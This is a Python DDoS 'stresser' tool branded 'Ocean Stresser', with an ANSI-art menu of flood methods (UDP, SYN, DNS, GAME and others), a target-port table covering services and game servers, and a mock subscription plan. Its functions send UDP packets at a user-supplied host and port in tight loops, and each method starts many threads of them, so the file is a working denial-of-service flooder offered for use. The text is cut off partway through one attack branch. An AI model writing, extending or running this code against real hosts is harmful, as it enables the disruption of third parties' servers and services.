#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#Ocean API Color Example: \x1b[38;2;115;140;225m
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json
import requests
from time import sleep
nicknm = "root"
banner =  """
\x1b[38;2;115;140;225m               ╔═╗╔═╗╔═╗╔═╗╔╗╔\x1b[38;2;22;252;221m╔═╗╔╦╗╦═╗╔═╗╔═╗╔═╗╔═╗╦═╗
\x1b[38;2;115;140;225m               ║ ║║  ║╣ ╠═╣║║║\x1b[38;2;22;252;221m╚═╗ ║ ╠╦╝║╣ ╚═╗╚═╗║╣ ╠╦╝
\x1b[38;2;115;140;225m               ╚═╝╚═╝╚═╝╩ ╩╝╚╝\x1b[38;2;22;252;221m╚═╝ ╩ ╩╚═╚═╝╚═╝╚═╝╚═╝╩╚═

"""
universalcooldown = """

\x1b[38;2;115;140;225m              ╔═╗╔═╗╔═╗╔═╗╔╗╔\x1b[38;2;22;252;221m╔═╗╔╦╗╦═╗╔═╗╔═╗╔═╗╔═╗╦═╗
\x1b[38;2;115;140;225m              ║ ║║  ║╣ ╠═╣║║║\x1b[38;2;22;252;221m╚═╗ ║ ╠╦╝║╣ ╚═╗╚═╗║╣ ╠╦╝
\x1b[38;2;115;140;225m              ╚═╝╚═╝╚═╝╩ ╩╝╚╝\x1b[38;2;22;252;221m╚═╝ ╩ ╩╚═╚═╝╚═╝╚═╝╚═╝╩╚═
\033[1;37m                  Universal Cooldown: 10 secs 
\033[1;37m             Please wait for your universal cooldown to end.
\x1b[38;2;22;252;221m
"""

attacked =  """
\x1b[38;2;126;161;206m               ╔═╗╔═╗╔═╗╔═╗╔╗╔\x1b[38;2;22;252;221m╔═╗╔╦╗╦═╗╔═╗╔═╗╔═╗╔═╗╦═╗
\x1b[38;2;126;161;206m               ║ ║║  ║╣ ╠═╣║║║\x1b[38;2;22;252;221m╚═╗ ║ ╠╦╝║╣ ╚═╗╚═╗║╣ ╠╦╝
\x1b[38;2;126;161;206m               ╚═╝╚═╝╚═╝╩ ╩╝╚╝\x1b[38;2;22;252;221m╚═╝ ╩ ╩╚═╚═╝╚═╝╚═╝╚═╝╩╚═                       
\x1b[38;2;126;161;206m             ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄     .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄
\x1b[38;2;126;161;206m            ▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ▐█ ▀. ▀▄.▀·•█▌▐█•██  
\x1b[38;2;126;161;206m            ▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪
\x1b[38;2;126;161;206m            ▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·
\x1b[38;2;126;161;206m             ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀ 

"""

helpservice =  """
\x1b[38;2;115;140;225m               ╔═╗╔═╗╔═╗╔═╗╔╗╔\x1b[38;2;22;252;221m╔═╗╔╦╗╦═╗╔═╗╔═╗╔═╗╔═╗╦═╗
\x1b[38;2;115;140;225m               ║ ║║  ║╣ ╠═╣║║║\x1b[38;2;22;252;221m╚═╗ ║ ╠╦╝║╣ ╚═╗╚═╗║╣ ╠╦╝
\x1b[38;2;115;140;225m               ╚═╝╚═╝╚═╝╩ ╩╝╚╝\x1b[38;2;22;252;221m╚═╝ ╩ ╩╚═╚═╝╚═╝╚═╝╚═╝╩╚═
\033[0;34m                            Plan
\033[0;34m                           Layer4
\033[0;34m                            Help
"""

ports = """
                              \x1b[38;2;240;240;240m╔════════\x1b[38;2;120;120;120m═══════╗
                              \x1b[38;2;240;240;240m║     \x1b[38;2;239;239;239mPorts    \x1b[38;2;120;120;120m ║
               \x1b[38;2;240;240;240m╔══════════════╩════════╦\x1b[38;2;120;120;120m══════╩═══════════════╗
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m22 - \x1b[38;2;120;120;120mSSH            \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m3306 - \x1b[38;2;239;239;239mMYSQL       \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m23 - \x1b[38;2;120;120;120mTELNET         \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m3689 - \x1b[38;2;239;239;239mITUNES      \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m25 - \x1b[38;2;120;120;120mSMTP           \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m3784 - \x1b[38;2;239;239;239mVENT        \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m53 - \x1b[38;2;120;120;120mDNS            \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m4000 - \x1b[38;2;239;239;239mICQ         \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m67 - \x1b[38;2;120;120;120mDHCP           \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m5190 - \x1b[38;2;239;239;239mAOL         \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m80 - \x1b[38;2;120;120;120mHTTP           \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m30120 - \x1b[38;2;239;239;239mFIVEM      \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m88 - \x1b[38;2;120;120;120mKERBEROS       \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m3074 - \x1b[38;2;239;239;239mXBOX        \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m137 - \x1b[38;2;120;120;120mNETBIOS       \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m3478 - \x1b[38;2;239;239;239mPSN         \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m143 - \x1b[38;2;120;120;120mIMAP4         \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m28960 - \x1b[38;2;239;239;239mCOD        \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m161 - \x1b[38;2;120;120;120mSNMP          \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m27014 - \x1b[38;2;239;239;239mMW2        \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m389 - \x1b[38;2;120;120;120mLDAP          \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m27020 - \x1b[38;2;239;239;239mCSSTRIKE   \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m443 - \x1b[38;2;120;120;120mHTTPS         \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m25565 - \x1b[38;2;239;239;239mMC         \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m550 - \x1b[38;2;120;120;120mRIP           \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m27015 - \x1b[38;2;239;239;239mTF2        \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m990 - \x1b[38;2;120;120;120mSFTP_SSL      \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m3724 - \x1b[38;2;239;239;239mWOW         \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m1433 - \x1b[38;2;120;120;120mMS_SQL       \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m5000 - \x1b[38;2;239;239;239mLOL         \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m║   \x1b[38;2;180;180;180m1863 - \x1b[38;2;120;120;120mMSN          \x1b[38;2;120;120;120m║   \x1b[38;2;90;90;90m5060 - \x1b[38;2;239;239;239mPS          \x1b[38;2;120;120;120m║
               \x1b[38;2;240;240;240m╚═══════════════════════╩\x1b[38;2;120;120;120m══════════════════════╝
"""



layer4 = """
\x1b[38;2;115;140;225m               ╔═╗╔═╗╔═╗╔═╗╔╗╔\x1b[38;2;22;252;221m╔═╗╔╦╗╦═╗╔═╗╔═╗╔═╗╔═╗╦═╗
\x1b[38;2;115;140;225m               ║ ║║  ║╣ ╠═╣║║║\x1b[38;2;22;252;221m╚═╗ ║ ╠╦╝║╣ ╚═╗╚═╗║╣ ╠╦╝
\x1b[38;2;115;140;225m               ╚═╝╚═╝╚═╝╩ ╩╝╚╝\x1b[38;2;22;252;221m╚═╝ ╩ ╩╚═╚═╝╚═╝╚═╝╚═╝╩╚═
\033[0;34m        ╔═════════════╦═════════════════════════════════╗
\033[0;34m        ║ UDP         ║ UDP Method.                     ║
\033[0;34m        ║ SYN         ║ SYN Method.                     ║
\033[0;34m        ║ HOME        ║ HOME Method.                    ║
\033[0;34m        ║ KITCHENGUN  ║ Kitchen Gun.                    ║
\033[0;34m        ║ NFO         ║ NFO Method.                     ║
\033[0;34m        ║ TCP         ║ TCP Method.                     ║
\033[0;34m        ║ TELNET      ║ Telnet Method.                  ║
\033[0;34m        ║ OVH-AMP     ║ OVH Amp Method.                 ║
\033[0;34m        ║ VSE         ║ VSE Method.                     ║
\033[0;34m        ║ GAME        ║ Game Method.                    ║
\033[0;34m        ║ OCEAN-OP    ║ OP UDP And GAME Method.         ║
\033[0;34m        ║ DNS         ║ DNS Method.                     ║
\033[0;34m        ╚═════════════╩═════════════════════════════════╝ 
"""

layer7 = """
\033[0;34m        ╔═════════════╦═════════════════════════════════╗
\033[0;34m        ║             ║                                 ║
\033[0;34m        ║             ║                                 ║
\033[0;34m        ║             ║                                 ║
\033[0;34m        ║             ║                                 ║
\033[0;34m        ║             ║                                 ║
\033[0;34m        ║             ║                                 ║
\033[0;34m        ║             ║                                 ║
\033[0;34m        ║             ║                                 ║
\033[0;34m        ║             ║                                 ║
\033[0;34m        ║             ║                                 ║
\033[0;34m        ║             ║                                 ║
\033[0;34m        ║             ║                                 ║
\033[0;34m        ║             ║                                 ║
\033[0;34m        ╚═════════════╩═════════════════════════════════╝
"""

plan =  """
\033[0;34m ╔═╗╔═╗╔═╗╔═╗╔╗╔╔═╗╔╦╗╦═╗╔═╗╔═╗╔═╗╔═╗╦═╗
\033[0;34m ║ ║║  ║╣ ╠═╣║║║╚═╗ ║ ╠╦╝║╣ ╚═╗╚═╗║╣ ╠╦╝
\033[0;34m ╚═╝╚═╝╚═╝╩ ╩╝╚╝╚═╝ ╩ ╩╚═╚═╝╚═╝╚═╝╚═╝╩╚═ 
\033[0;34m VIP = True
\033[0;34m Username = root
\033[0;34m Admin = True
\033[0;34m Expiry = 1 Year
\033[0;34m API Access = True
\033[0;34m Cons: 1
\033[0;34m Maxtime: 7200 secs
"""

cookie = open(".sinfull_cookie","w+")
cooldown = """
\033[0;34m            ╔═╗╔═╗╔═╗╔═╗╔╗╔╔═╗╔╦╗╦═╗╔═╗╔═╗╔═╗╔═╗╦═╗
\033[0;34m            ║ ║║  ║╣ ╠═╣║║║╚═╗ ║ ╠╦╝║╣ ╚═╗╚═╗║╣ ╠╦╝
\033[0;34m            ╚═╝╚═╝╚═╝╩ ╩╝╚╝╚═╝ ╩ ╩╚═╚═╝╚═╝╚═╝╚═╝╩╚═ """
invalid = """"""
cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		sys.stdout.write("\x1b]2;~ | Ocean Stresser | My Expiry: 7977 Years | Maxtime: 86400 seconds | ~ \x07")
		sin = input("\033[0;36m\033[1m{}\033[0;35m\033[1m♠\033[0;36mOcean\033[1mStresser\033[0;32m_>\x1b[38;2;22;252;221m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "ports":
			os.system("clear")
			print(ports)
		if sinput == "layer4":
			os.system("clear")
			time.sleep(0.1)
			print(layer4)
		if sinput == "l7":
			os.system("clear")
			print(layer7)
		if sinput == "layer7":
			os.system("clear")
			print(layer7)
		if sinput == "l4":
			os.system("clear")
			time.sleep(0.1)
			print(layer4)
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "plan":
			os.system ("clear")
			print (plan)
			main()
		elif sinput == "help":
			os.system ('clear')
			print (helpservice)
			main()
		elif sinput == "logout":
			print("Leaving Stresser in 5 Seconds")
			time.sleep(5)
			os.system ("clear")
			exit()
		elif sinput == "dns":
			try:
				if running >= 2:
					print("\033[97m\033[1;33mYou have reached max concurrents and must wait for your attack to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('clear')
					print("\033[97mAttack Sent! | Ocean API |")
					time.sleep(3)
					os.system('clear') 
					print(universalcooldown)
					time.sleep(10)
					os.system("clear")
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "home":
			try:
				if running >= 2:
					print("\033[97m\033[1;33mYou have reached max concurrents and must wait for your attack to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('clear')
						print("\033[97m[-] Loading Ocean API.")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[\] Loading Ocean API..")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[|] Loading Ocean API...")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[/] Loading Ocean API....")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[+] Loading Ocean API....")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[-] Loading Ocean API..")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[/] Loading Ocean API.")
						time.sleep(1)
						os.system('clear')
						print("\033[97mAttack Sent! | Ocean API ~ |")
						time.sleep(3)
						os.system('clear')
						print(universalcooldown)
						time.sleep(10)
						os.system("clear") 
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
				if running >= 2:
					print("\033[97m\033[1;33mYou have reached max concurrents and must wait for your attack to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start() 
						os.system('clear')
						print("\033[97m[-] Loading Ocean API.")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[\] Loading Ocean API..")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[|] Loading Ocean API...")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[/] Loading Ocean API....")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[+] Loading Ocean API....")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[-] Loading Ocean API..")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[/] Loading Ocean API.")
						time.sleep(1)
						os.system('clear')
						print("\033[97mAttack Sent! | Ocean API ~ |")
						time.sleep(3)
						os.system('clear')
						print(universalcooldown)
						time.sleep(10)
						os.system("clear")
						print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 2:
					print("\033[97m\033[1;33mYou have reached max concurrents and must wait for your attack to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print("\033[97m[-] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[\] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[|] Loading Ocean API...")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[+] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[-] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97mAttack Sent! | Ocean API ~ |")
					time.sleep(3)
					os.system('clear')
					print(universalcooldown)
					time.sleep(10)
					os.system("clear") 
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "game":
			try:
				if running >= 2:
					print("\033[97m\033[1;33mYou have reached max concurrents and must wait for your attack to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print("\033[97m[-] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[\] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[|] Loading Ocean API...")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[+] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[-] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97mAttack Sent! | Ocean API ~ |")
					time.sleep(3)
					os.system('clear')
					print(universalcooldown)
					time.sleep(10)
					os.system("clear") 
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ocean-op":
			try:
				if running >= 2:
					print("\033[97m\033[1;33mYou have reached max concurrents and must wait for your attack to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
